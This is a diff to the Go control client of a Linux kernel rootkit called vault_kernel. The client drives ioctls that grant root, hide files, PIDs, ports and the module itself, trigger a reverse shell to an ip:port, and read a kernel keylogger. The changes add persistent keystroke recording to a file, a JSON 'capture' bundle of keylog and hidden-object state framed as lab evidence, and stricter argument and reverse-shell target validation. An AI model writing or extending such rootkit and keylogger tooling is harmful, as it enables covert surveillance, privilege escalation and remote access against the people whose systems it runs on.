@@ -14,7 +14,7 @@ import (
 	"github.com/ruby570bocadito/vault-kernel/internal/vaultkernel"
 )
 
-const clientVersion = "3.8"
+const clientVersion = "3.9"
 
 // Poll interval contract of `keylog --follow` (milliseconds), mirrored
 // by KEYLOG_DEFAULT_INTERVAL_MS / KEYLOG_MIN_INTERVAL_MS in the Python CLI.
@@ -22,6 +22,10 @@ const (
 	keylogDefaultIntervalMs = 500
 	keylogMinIntervalMs     = 50
 )
+
+// watchDefaultIntervalMs is the refresh cadence of `watch` (parity
+// with WATCH_DEFAULT_INTERVAL_MS in the Python CLI).
+const watchDefaultIntervalMs = 1000
 
 const devicePath = "/dev/vault_kernel"
 
@@ -45,7 +49,9 @@ func verifyRootSelf() bool {
 }
 
 // verifyRootRemote checks the effective uid of another PID through
-// /proc/<pid>/status (4th field of the Uid: line is euid).
+// /proc/<pid>/status. The Uid: line carries FOUR numbers (real,
+// effective, saved, fs); fields[2] is the EFFECTIVE one (the 2nd
+// number, 3rd whitespace token counting the "Uid:" label).
 func verifyRootRemote(pid int) bool {
 	data, err := os.ReadFile(fmt.Sprintf("/proc/%d/status", pid))
 	if err != nil {
@@ -82,6 +88,93 @@ func parseGiveRootPID(args []string) (int, error) {
 		return 0, fmt.Errorf("invalid PID: %s (numeric PID, or none for self)", args[0])
 	}
 	return pid, nil
+}
+
+// strictArgs is the v3.9 grammar floor for simple commands: exactly
+// `want` positional arguments — missing or EXTRA arguments are usage
+// errors, never silently ignored (v3.9 audit: 15 of 20 dispatcher
+// cases swallowed excess args while the Python/argparse client
+// rejects them).  `usage` is printed verbatim on mismatch.
+func strictArgs(args []string, want int, usage string) error {
+	if len(args) > want {
+		return fmt.Errorf("%s (unexpected argument: %s)", usage, args[want])
+	}
+	if len(args) < want {
+		return fmt.Errorf("%s", usage)
+	}
+	return nil
+}
+
+// parseFlagOnly is the strict grammar of commands whose ONLY argument
+// is one optional flag (doctor/list/stats --json): no flag, the flag
+// once, or a usage error — anything else was silently ignored before
+// v3.9 (`list extra` listed as if bare).
+func parseFlagOnly(args []string, flag, usage string) (bool, error) {
+	if len(args) == 0 {
+		return false, nil
+	}
+	if len(args) == 1 && args[0] == flag {
+		return true, nil
+	}
+	return false, fmt.Errorf("usage: %s", usage)
+}
+
+// parsePIDArg validates a REQUIRED pid operand of hide-pid/unhide-pid:
+// numeric and >= 1.  Before v3.9 both clients accepted 0/negative
+// PIDs, which the module stores verbatim in the hide-list ("pid: -5"
+// in `list`) although nothing can ever match them (hooked_kill filters
+// pid > 0 only).  Pure and unit-testable without a device.
+func parsePIDArg(s string) (int, error) {
+	pid, err := strconv.Atoi(s)
+	if err != nil {
+		return 0, fmt.Errorf("invalid PID: %s (numeric, >= 1)", s)
+	}
+	if pid < 1 {
+		return 0, fmt.Errorf("invalid PID: %d (must be >= 1)", pid)
+	}
+	return pid, nil
+}
+
+// parsePortArg validates a REQUIRED port operand (hide-port,
+// unhide-port and magic-encode): 1-65535.  Extracted from the
+// dispatcher, where the same check was duplicated three times, as a
+// pure function (v3.9).
+func parsePortArg(s string) (uint16, error) {
+	p, err := strconv.Atoi(s)
+	if err != nil || p < 1 || p > 65535 {
+		return 0, fmt.Errorf("invalid port: %s", s)
+	}
+	return uint16(p), nil
+}
+
+// parseShellTarget validates the `shell <ip:port>` operand BEFORE
+// hitting the device: non-empty host, numeric port 1-65535, split at
+// the LAST colon.  Before v3.9 Go only checked "contains :" (so
+// `abc:def` reached the kernel and died with a raw EINVAL) and the
+// Python client validated nothing — the module's first-colon split was
+// the only barrier.  IPv6 literals are NOT supported by design: the
+// module splits at the FIRST colon, so this parser rejects them with a
+// clear client-side error instead.  Pure and unit-testable.
+func parseShellTarget(target string) error {
+	if target == "" {
+		return fmt.Errorf("usage: vault_kernel shell <ip:port>")
+	}
+	// Exactly ONE colon: the module splits at the FIRST colon, so
+	// anything with 2+ colons (IPv6 literals included, `a:b:44`)
+	// would reach it as a mangled host/port pair — rejected here
+	// with a clear client-side error instead.
+	if strings.Count(target, ":") != 1 {
+		return fmt.Errorf("invalid target %q: use ip:port (IPv6 not supported)", target)
+	}
+	i := strings.Index(target, ":")
+	if i == 0 || i == len(target)-1 {
+		return fmt.Errorf("invalid target %q: empty host or port", target)
+	}
+	port, err := strconv.Atoi(target[i+1:])
+	if err != nil || port < 1 || port > 65535 {
+		return fmt.Errorf("invalid port in target %q: %s", target, target[i+1:])
+	}
+	return nil
 }
 
 func giveRoot(f *os.File, pid int) error {
@@ -222,7 +315,7 @@ func listHiddenJSON(f *os.File) error {
 	return nil
 }
 
-func keylogRead(f *os.File) error {
+func keylogRead(f *os.File, outPath string) error {
 	buf := make([]byte, 4096)
 	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_KEYLOG_READ, unsafe.Pointer(&buf[0]))
 	if err != 0 {
@@ -234,6 +327,18 @@ func keylogRead(f *os.File) error {
 	} else {
 		fmt.Printf("[*] Keystroke log:\n%s\n", output)
 	}
+	if outPath != "" && output != "" {
+		// v3.9: persist the buffer as one record; same append+flush
+		// contract as the follow stream (keylogSink).
+		sink, err := newKeylogSink(outPath)
+		if err != nil {
+			return err
+		}
+		defer sink.close()
+		if err := sink.writeRecord(output + "\n"); err != nil {
+			return err
+		}
+	}
 	return nil
 }
 
@@ -242,17 +347,21 @@ type keylogOpts struct {
 	follow     bool
 	timestamps bool
 	intervalMs int
+	outputPath string
 }
 
 // parseKeylogArgs owns the `keylog` argument grammar:
 //
-//	keylog [--follow [ms]] [--timestamps]
+//	keylog [--follow [ms]] [--timestamps] [--output FILE]
 //
 // The poll interval stays POSITIONAL after --follow (documented contract
-// since v3.5, mirroring the Python CLI's --interval); --timestamps may
-// appear anywhere; --timestamps without --follow is a usage error in
-// BOTH clients.  Extracted as a pure function so the grammar is
-// unit-testable without a device (v3.8 — before, any arg that was not
+// since v3.5, mirroring the Python CLI's --interval); --timestamps and
+// --output may appear anywhere; --timestamps without --follow is a usage
+// error in BOTH clients.  v3.9 adds --output FILE: exactly one FILE
+// operand, required when the flag is present (a second --output, a
+// missing operand or an empty path is a usage error, same strictness as
+// the positional interval).  Extracted as a pure function so the grammar
+// is unit-testable without a device (v3.8 — before, any arg that was not
 // `--follow` was silently ignored in the one-shot path).
 func parseKeylogArgs(args []string) (keylogOpts, error) {
 	opts := keylogOpts{intervalMs: keylogDefaultIntervalMs}
@@ -263,9 +372,21 @@ func parseKeylogArgs(args []string) (keylogOpts, error) {
 			opts.follow = true
 		case "--timestamps":
 			opts.timestamps = true
+		case "--output":
+			if i+1 >= len(args) {
+				return opts, fmt.Errorf("--output requires a FILE operand")
+			}
+			if opts.outputPath != "" {
+				return opts, fmt.Errorf("--output given more than once")
+			}
+			i++
+			opts.outputPath = args[i]
+			if opts.outputPath == "" {
+				return opts, fmt.Errorf("--output requires a FILE operand")
+			}
 		default:
 			if !opts.follow || seenInterval {
-				return opts, fmt.Errorf("usage: vault_kernel keylog [--follow [ms]] [--timestamps]")
+				return opts, fmt.Errorf("usage: vault_kernel keylog [--follow [ms]] [--timestamps] [--output FILE]")
 			}
 			n, err := strconv.Atoi(args[i])
 			if err != nil || n < keylogMinIntervalMs {
@@ -279,6 +400,36 @@ func parseKeylogArgs(args []string) (keylogOpts, error) {
 		return opts, fmt.Errorf("--timestamps requires --follow")
 	}
 	return opts, nil
+}
+
+// parseCaptureArgs owns the `capture` argument grammar (v3.9):
+//
+//	capture [--out FILE]
+//
+// Strict like the rest of the v3.8/v3.9 grammars: --out takes exactly
+// one FILE operand and may appear at most once; any other token is a
+// usage error. Without --out the bundle goes to stdout.
+func parseCaptureArgs(args []string) (string, error) {
+	outPath := ""
+	for i := 0; i < len(args); i++ {
+		switch args[i] {
+		case "--out":
+			if i+1 >= len(args) {
+				return "", fmt.Errorf("--out requires a FILE operand")
+			}
+			if outPath != "" {
+				return "", fmt.Errorf("--out given more than once")
+			}
+			i++
+			outPath = args[i]
+			if outPath == "" {
+				return "", fmt.Errorf("--out requires a FILE operand")
+			}
+		default:
+			return "", fmt.Errorf("usage: vault_kernel capture [--out FILE]")
+		}
+	}
+	return outPath, nil
 }
 
 // formatKeylogEvent renders one follow event — mirrors
@@ -298,11 +449,51 @@ func formatKeylogEvent(newText, ts string, timestamps, wrapped bool) string {
 	return newText
 }
 
+// keylogSink is the --output persistence of the keylog stream: one
+// append-only file, flushed per event. The file is created 0600 —
+// captures may contain keystrokes. Pure enough to unit-test with a
+// temp directory (the follow loop only feeds it records).
+type keylogSink struct {
+	f *os.File
+}
+
+func newKeylogSink(path string) (*keylogSink, error) {
+	f, err := os.OpenFile(path, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0600)
+	if err != nil {
+		return nil, fmt.Errorf("cannot open keylog output %s: %w", path, err)
+	}
+	return &keylogSink{f: f}, nil
+}
+
+func (s *keylogSink) writeRecord(rec string) error {
+	if _, err := s.f.WriteString(rec); err != nil {
+		return fmt.Errorf("keylog output write failed: %w", err)
+	}
+	return s.f.Sync()
+}
+
+func (s *keylogSink) close() {
+	s.f.Close()
+}
+
 // keylogFollow polls KEYLOG_READ and streams new keystrokes as they
 // arrive.  The module's buffer shifts left when full, so a suffix
 // diff is printed when the common prefix breaks (buffer wrap).
+// With outputPath (v3.9) every emitted event is ALSO appended to the
+// file and flushed — the exact bytes printed to the terminal, so the
+// file is a faithful transcript (timestamps included when active).
 // Exits on Ctrl-C (default SIGINT handling).
-func keylogFollow(f *os.File, intervalMs int, timestamps bool) error {
+func keylogFollow(f *os.File, intervalMs int, timestamps bool, outputPath string) error {
+	var sink *keylogSink
+	if outputPath != "" {
+		var err error
+		sink, err = newKeylogSink(outputPath)
+		if err != nil {
+			return err
+		}
+		defer sink.close()
+		fmt.Printf("[*] Recording to %s\n", outputPath)
+	}
 	fmt.Printf("[*] Following keystroke log (poll %d ms) — Ctrl-C to stop\n", intervalMs)
 	prev := ""
 	for {
@@ -319,7 +510,13 @@ func keylogFollow(f *os.File, intervalMs int, timestamps bool) error {
 			} else {
 				wrapped = true
 			}
-			fmt.Print(formatKeylogEvent(newText, time.Now().Format("15:04:05"), timestamps, wrapped))
+			event := formatKeylogEvent(newText, time.Now().Format("15:04:05"), timestamps, wrapped)
+			fmt.Print(event)
+			if sink != nil {
+				if err := sink.writeRecord(event + "\n"); err != nil {
+					return err
+				}
+			}
 			prev = cur
 		}
 		time.Sleep(time.Duration(intervalMs) * time.Millisecond)
@@ -479,13 +676,13 @@ func showStatsJSON(f *os.File) error {
 // meaning or shape; additive fields keep it at 1 (v3.7 added it).
 const jsonSchemaVersion = 1
 
-// marshalStatsJSON converts a parsed GET_STATS report into the versioned
-// JSON envelope. Numeric values become JSON numbers, the rest stay
-// strings. Extracted from showStatsJSON as a pure function so the
-// envelope is unit-testable without a device.
-func marshalStatsJSON(raw map[string]string) ([]byte, error) {
+// statsMap converts a parsed GET_STATS report into the JSON-ready
+// value map shared by `stats --json` (marshalStatsJSON) and the
+// `capture` evidence bundle (buildCaptureReport): numeric values
+// become numbers, the rest stay strings. Keep the conversion in ONE
+// place so both documents treat a future key identically.
+func statsMap(raw map[string]string) map[string]interface{} {
 	out := make(map[string]interface{}, len(raw)+1)
-	out["schema"] = jsonSchemaVersion
 	for k, v := range raw {
 		if n, err := strconv.Atoi(v); err == nil {
 			out[k] = n
@@ -493,7 +690,92 @@ func marshalStatsJSON(raw map[string]string) ([]byte, error) {
 			out[k] = v
 		}
 	}
+	return out
+}
+
+// marshalStatsJSON converts a parsed GET_STATS report into the versioned
+// JSON envelope. Numeric values become JSON numbers, the rest stay
+// strings. Extracted from showStatsJSON as a pure function so the
+// envelope is unit-testable without a device.
+func marshalStatsJSON(raw map[string]string) ([]byte, error) {
+	out := statsMap(raw)
+	out["schema"] = jsonSchemaVersion
 	return json.MarshalIndent(out, "", "  ")
+}
+
+// captureReport is the `capture` evidence bundle: a single JSON
+// document freezing the module state for a lab report. Field order is
+// contractual (SCHEMAS.md); stats reuses the stats --json conversion
+// (numbers where numeric, keys sorted by the JSON encoder).
+type captureReport struct {
+	Schema        int                    `json:"schema"`
+	CapturedAt    string                 `json:"captured_at"`
+	ClientVersion string                 `json:"client_version"`
+	ModuleInSysfs bool                   `json:"module_in_sysfs"`
+	Stats         map[string]interface{} `json:"stats"`
+	Hidden        ioctl.HiddenList       `json:"hidden"`
+	Keylog        string                 `json:"keylog"`
+}
+
+// buildCaptureReport assembles the evidence bundle from already-parsed
+// inputs — pure, so the envelope is unit-testable without a device
+// (v3.9). Callers own the ioctls and the timestamp: capturedAt is the
+// UTC RFC3339 instant of the SNAPSHOT, taken after the buffers were
+// read.
+func buildCaptureReport(statsRaw map[string]string, hidden ioctl.HiddenList, keylogText, capturedAt string, moduleInSysfs bool, clientVer string) captureReport {
+	stats := statsMap(statsRaw)
+	return captureReport{
+		Schema:        jsonSchemaVersion,
+		CapturedAt:    capturedAt,
+		ClientVersion: clientVer,
+		ModuleInSysfs: moduleInSysfs,
+		Stats:         stats,
+		Hidden:        hidden,
+		Keylog:        keylogText,
+	}
+}
+
+// runCapture reads stats, the hidden list and the keylog buffer in one
+// pass and emits the evidence bundle. With outPath it writes the file
+// (0600 — captures may contain keystrokes) and prints a one-line
+// summary; without it the JSON goes to stdout like the other --json
+// commands.
+func runCapture(f *os.File, outPath string) error {
+	statsBuf := make([]byte, 4096)
+	if _, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_GET_STATS, unsafe.Pointer(&statsBuf[0])); err != 0 {
+		return fmt.Errorf("capture: GET_STATS failed: %w", err)
+	}
+	listBuf := make([]byte, 4096)
+	if _, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_LIST_HIDDEN, unsafe.Pointer(&listBuf[0])); err != 0 {
+		return fmt.Errorf("capture: LIST_HIDDEN failed: %w", err)
+	}
+	keyBuf := make([]byte, 4096)
+	if _, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_KEYLOG_READ, unsafe.Pointer(&keyBuf[0])); err != 0 {
+		return fmt.Errorf("capture: KEYLOG_READ failed: %w", err)
+	}
+
+	_, sysfsErr := os.Stat(sysfsModulePath)
+	rep := buildCaptureReport(
+		ioctl.ParseStatsReport(strings.TrimRight(string(statsBuf), "\x00")),
+		ioctl.ParseHiddenList(strings.TrimRight(string(listBuf), "\x00")),
+		strings.TrimRight(string(keyBuf), "\x00"),
+		time.Now().UTC().Format(time.RFC3339),
+		sysfsErr == nil,
+		clientVersion,
+	)
+	j, err := json.MarshalIndent(rep, "", "  ")
+	if err != nil {
+		return err
+	}
+	if outPath == "" {
+		fmt.Println(string(j))
+		return nil
+	}
+	if err := os.WriteFile(outPath, append(j, '\n'), 0600); err != nil {
+		return fmt.Errorf("capture: cannot write %s: %w", outPath, err)
+	}
+	fmt.Printf("[+] Evidence bundle written to %s (%d bytes)\n", outPath, len(j)+1)
+	return nil
 }
 
 // hiddenJSONEnvelope wraps the parsed hidden list with the schema
@@ -717,6 +999,72 @@ func runDoctor(jsonMode bool) error {
 	return nil
 }
 
+// parsePIDArgs combines the strict one-operand grammar with
+// parsePIDArg for hide-pid/unhide-pid (pure; unit-testable).
+func parsePIDArgs(args []string, cmd string) (int, error) {
+	usage := "usage: vault_kernel " + cmd + " <pid>"
+	if err := strictArgs(args, 1, usage); err != nil {
+		return 0, err
+	}
+	return parsePIDArg(args[0])
+}
+
+// parsePortArgs combines the strict one-operand grammar with
+// parsePortArg for hide-port/unhide-port (pure; unit-testable).
+func parsePortArgs(args []string, cmd string) (uint16, error) {
+	usage := "usage: vault_kernel " + cmd + " <port>"
+	if err := strictArgs(args, 1, usage); err != nil {
+		return 0, err
+	}
+	return parsePortArg(args[0])
+}
+
+// watchOpts is the parsed argument set of the `watch` command.
+type watchOpts struct {
+	intervalMs int
+}
+
+// parseWatchArgs owns the `watch` grammar (v3.9, pure):
+//
+//	watch [--interval MS]
+//
+// Default 1000 ms, --interval takes a required operand (>= 50 ms,
+// same floor as keylog), and ANY extra argument is a usage error —
+// `watch --interval 500 extra` used to ignore "extra" in silence.
+func parseWatchArgs(args []string) (watchOpts, error) {
+	opts := watchOpts{intervalMs: watchDefaultIntervalMs}
+	for i := 0; i < len(args); i++ {
+		if args[i] != "--interval" {
+			return opts, fmt.Errorf("usage: vault_kernel watch [--interval MS]")
+		}
+		if i+1 >= len(args) {
+			return opts, fmt.Errorf("--interval requires an MS operand")
+		}
+		i++
+		n, err := strconv.Atoi(args[i])
+		if err != nil || n < keylogMinIntervalMs {
+			return opts, fmt.Errorf("invalid interval: %s (milliseconds, min %d)", args[i], keylogMinIntervalMs)
+		}
+		opts.intervalMs = n
+	}
+	return opts, nil
+}
+
+// parseMagicEncodeArgs owns the `magic-encode` grammar (v3.9):
+// exactly <word> <port>, port 1-65535 — extras were silently ignored
+// before.  Pure and unit-testable (the command never touches the
+// device; it lives before openDevice in the dispatcher).
+func parseMagicEncodeArgs(args []string) (string, uint16, error) {
+	if len(args) != 2 {
+		return "", 0, fmt.Errorf("usage: vault_kernel magic-encode <word> <port>")
+	}
+	port, err := parsePortArg(args[1])
+	if err != nil {
+		return "", 0, err
+	}
+	return args[0], port, nil
+}
+
 func printVersion() {
 	fmt.Printf("vault_kernel CLI v%s (ioctl magic 0xC0, signal trigger %d)\n",
 		clientVersion, ioctl.MagicSignal)
@@ -745,9 +1093,10 @@ Commands:
   shell <ip:port>         Trigger reverse shell
   magic <word>            Set magic packet trigger word
   magic-encode <word> <port>  Print the kill() trigger for a word+port
-  keylog [--follow [ms]] [--timestamps]
+  keylog [--follow [ms]] [--timestamps] [--output FILE]
                           Read captured keystrokes (stream with --follow)
   keylog-clear            Clear keylogger buffer
+  capture [--out FILE]    Evidence bundle: stats + hidden + keylog as JSON
   hide-module             Hide rootkit from lsmod
   unhide-module           Make rootkit visible in lsmod
   reset                   Clear ALL hidden files, PIDs and ports
@@ -762,6 +1111,10 @@ func run() error {
 	}
 
 	if os.Args[1] == "status" {
+		// v3.9 strict grammar: `status extra` was silently tolerated.
+		if err := strictArgs(os.Args[2:], 0, "usage: vault_kernel status"); err != nil {
+			return err
+		}
 		if _, err := os.Stat(devicePath); err == nil {
 			fmt.Printf("[*] vault_kernel kernel module is LOADED\n    Device: %s\n", devicePath)
 		} else {
@@ -777,23 +1130,30 @@ func run() error {
 	}
 
 	if os.Args[1] == "version" || os.Args[1] == "-v" || os.Args[1] == "--version" {
+		// v3.9 strict grammar (matches the Python argparse surface).
+		if err := strictArgs(os.Args[2:], 0, "usage: vault_kernel version"); err != nil {
+			return err
+		}
 		printVersion()
 		return nil
 	}
 
 	if os.Args[1] == "doctor" {
-		return runDoctor(len(os.Args) > 2 && os.Args[2] == "--json")
+		jsonMode, err := parseFlagOnly(os.Args[2:], "--json", "vault_kernel doctor [--json]")
+		if err != nil {
+			return err
+		}
+		return runDoctor(jsonMode)
 	}
 
 	if os.Args[1] == "magic-encode" {
-		if len(os.Args) < 4 {
-			return fmt.Errorf("usage: vault_kernel magic-encode <word> <port>")
+		// v3.9: grammar extracted to a pure function (extras were
+		// silently ignored; the port check was duplicated inline).
+		word, port, err := parseMagicEncodeArgs(os.Args[2:])
+		if err != nil {
+			return err
 		}
-		p, err := strconv.Atoi(os.Args[3])
-		if err != nil || p < 1 || p > 65535 {
-			return fmt.Errorf("invalid port: %s", os.Args[3])
-		}
-		return magicEncode(os.Args[2], uint16(p))
+		return magicEncode(word, port)
 	}
 
 	f, err := openDevice()
@@ -813,96 +1173,93 @@ func run() error {
 		return giveRoot(f, pid)
 
 	case "hide-file":
-		if len(os.Args) < 3 {
-			return fmt.Errorf("usage: vault_kernel hide-file <name>")
+		// v3.9 strict grammar: `hide-file a b` used to hide "a" and
+		// silently drop "b".
+		if err := strictArgs(os.Args[2:], 1, "usage: vault_kernel hide-file <name>"); err != nil {
+			return err
 		}
 		return hideFile(f, os.Args[2])
 
 	case "unhide-file":
-		if len(os.Args) < 3 {
-			return fmt.Errorf("usage: vault_kernel unhide-file <name>")
+		if err := strictArgs(os.Args[2:], 1, "usage: vault_kernel unhide-file <name>"); err != nil {
+			return err
 		}
 		return unhideFile(f, os.Args[2])
 
 	case "hide-pid":
-		if len(os.Args) < 3 {
-			return fmt.Errorf("usage: vault_kernel hide-pid <pid>")
-		}
-		pid, err := strconv.Atoi(os.Args[2])
+		// v3.9: pid >= 1 (the module stores any int verbatim; a
+		// 0/negative entry can never match and pollutes `list`) +
+		// strict grammar via parsePIDArg.
+		pid, err := parsePIDArgs(os.Args[2:], "hide-pid")
 		if err != nil {
-			return fmt.Errorf("invalid PID: %s", os.Args[2])
+			return err
 		}
 		return hidePID(f, pid)
 
 	case "unhide-pid":
-		if len(os.Args) < 3 {
-			return fmt.Errorf("usage: vault_kernel unhide-pid <pid>")
-		}
-		pid, err := strconv.Atoi(os.Args[2])
+		pid, err := parsePIDArgs(os.Args[2:], "unhide-pid")
 		if err != nil {
-			return fmt.Errorf("invalid PID: %s", os.Args[2])
+			return err
 		}
 		return unhidePID(f, pid)
 
 	case "hide-port":
-		if len(os.Args) < 3 {
-			return fmt.Errorf("usage: vault_kernel hide-port <port>")
+		port, err := parsePortArgs(os.Args[2:], "hide-port")
+		if err != nil {
+			return err
 		}
-		p, err := strconv.Atoi(os.Args[2])
-		if err != nil || p < 1 || p > 65535 {
-			return fmt.Errorf("invalid port: %s", os.Args[2])
-		}
-		return hidePort(f, uint16(p))
+		return hidePort(f, port)
 
 	case "unhide-port":
-		if len(os.Args) < 3 {
-			return fmt.Errorf("usage: vault_kernel unhide-port <port>")
+		port, err := parsePortArgs(os.Args[2:], "unhide-port")
+		if err != nil {
+			return err
 		}
-		p, err := strconv.Atoi(os.Args[2])
-		if err != nil || p < 1 || p > 65535 {
-			return fmt.Errorf("invalid port: %s", os.Args[2])
-		}
-		return unhidePort(f, uint16(p))
+		return unhidePort(f, port)
 
 	case "list":
-		if len(os.Args) > 2 && os.Args[2] == "--json" {
+		jsonMode, err := parseFlagOnly(os.Args[2:], "--json", "vault_kernel list [--json]")
+		if err != nil {
+			return err
+		}
+		if jsonMode {
 			return listHiddenJSON(f)
 		}
 		return listHidden(f)
 
 	case "stats":
-		if len(os.Args) > 2 && os.Args[2] == "--json" {
+		jsonMode, err := parseFlagOnly(os.Args[2:], "--json", "vault_kernel stats [--json]")
+		if err != nil {
+			return err
+		}
+		if jsonMode {
 			return showStatsJSON(f)
 		}
 		return showStats(f)
 
 	case "watch":
-		interval := 1000
-		if len(os.Args) > 2 {
-			if os.Args[2] != "--interval" || len(os.Args) < 4 {
-				return fmt.Errorf("usage: vault_kernel watch [--interval MS]")
-			}
-			n, err := strconv.Atoi(os.Args[3])
-			if err != nil || n < 50 {
-				return fmt.Errorf("invalid interval: %s (milliseconds, min 50)", os.Args[3])
-			}
-			interval = n
+		// v3.9: grammar extracted to a pure parser — `watch --interval
+		// 500 extra` used to ignore "extra" in silence.
+		opts, err := parseWatchArgs(os.Args[2:])
+		if err != nil {
+			return err
 		}
-		return runWatch(f, interval)
+		return runWatch(f, opts.intervalMs)
 
 	case "shell":
-		if len(os.Args) < 3 {
-			return fmt.Errorf("usage: vault_kernel shell <ip:port>")
+		// v3.9: real ip:port validation (host non-empty, port 1-65535)
+		// instead of a bare "contains :" check; extras rejected.
+		if err := strictArgs(os.Args[2:], 1, "usage: vault_kernel shell <ip:port>"); err != nil {
+			return err
 		}
-		target := os.Args[2]
-		if !strings.Contains(target, ":") {
-			return fmt.Errorf("invalid target format, use ip:port")
+		if err := parseShellTarget(os.Args[2]); err != nil {
+			return err
 		}
-		return backdoorShell(f, target)
+		return backdoorShell(f, os.Args[2])
 
 	case "magic":
-		if len(os.Args) < 3 {
-			return fmt.Errorf("usage: vault_kernel magic <word>")
+		if err := strictArgs(os.Args[2:], 1, "usage: vault_kernel magic <word>"); err != nil {
+			return err
 		}
 		return backdoorMagic(f, os.Args[2])
 
@@ -916,20 +1273,39 @@ func run() error {
 			return err
 		}
 		if opts.follow {
-			return keylogFollow(f, opts.intervalMs, opts.timestamps)
+			return keylogFollow(f, opts.intervalMs, opts.timestamps, opts.outputPath)
 		}
-		return keylogRead(f)
+		return keylogRead(f, opts.outputPath)
+
+	case "capture":
+		outPath, err := parseCaptureArgs(os.Args[2:])
+		if err != nil {
+			return err
+		}
+		return runCapture(f, outPath)
 
 	case "keylog-clear":
+		if err := strictArgs(os.Args[2:], 0, "usage: vault_kernel keylog-clear"); err != nil {
+			return err
+		}
 		return keylogClear(f)
 
 	case "hide-module":
+		if err := strictArgs(os.Args[2:], 0, "usage: vault_kernel hide-module"); err != nil {
+			return err
+		}
 		return hideModule(f)
 
 	case "unhide-module":
+		if err := strictArgs(os.Args[2:], 0, "usage: vault_kernel unhide-module"); err != nil {
+			return err
+		}
 		return unhideModule(f)
 
 	case "reset":
+		if err := strictArgs(os.Args[2:], 0, "usage: vault_kernel reset"); err != nil {
+			return err
+		}
 		return resetAll(f)
 
 	default:
